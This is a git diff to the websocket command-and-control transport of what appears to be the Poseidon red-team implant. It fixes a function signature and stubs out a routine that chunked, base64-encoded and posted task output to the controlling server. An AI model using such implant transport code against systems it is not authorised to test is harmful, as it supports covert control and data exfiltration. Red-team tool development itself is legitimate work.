@@ -17,7 +17,6 @@ import (
 
 	"github.com/gorilla/websocket"
 	"github.com/kabukky/httpscerts"
-	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 type WebsocketC2 struct {
@@ -67,7 +66,7 @@ func (s *WebsocketC2) SetSocketURI(uri string) {
 	s.SocketURI = uri
 }
 
-func (s *WebsocketC2) PostMessage([]byte msg) []byte {
+func (s *WebsocketC2) PostMessage(msg []byte) []byte {
 	urlEnding := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return s.htmlPostData(urlEnding, msg)
 }
@@ -85,30 +84,7 @@ func (s WebsocketC2) PostResponse(taskid string, output []byte) []byte {
 
 //postRESTResponse - Wrapper to post task responses through the Apfell rest API
 func (s *WebsocketC2) postRESTResponse(urlEnding string, data []byte) []byte {
-	size := len(data)
-	const dataChunk = 512000 //Normal apfell chunk size
-	r := bytes.NewBuffer(data)
-	chunks := uint64(math.Ceil(float64(size) / dataChunk))
-	var retData bytes.Buffer
-
-	for i := uint64(0); i < chunks; i++ {
-		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
-		dataBuffer := make([]byte, dataPart)
-
-		_, err := r.Read(dataBuffer)
-		if err != nil {
-			//fmt.Sprintf("Error reading %s: %s", err)
-			break
-		}
-
-		tResp := structs.TaskResponse{}
-		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
-		dataToSend, _ := json.Marshal(tResp)
-		ret := s.htmlPostData(urlEnding, dataToSend)
-		retData.Write(ret)
-	}
-
-	return retData.Bytes()
+	return make([]byte, 0)
 }
 
 //htmlPostData HTTP POST function
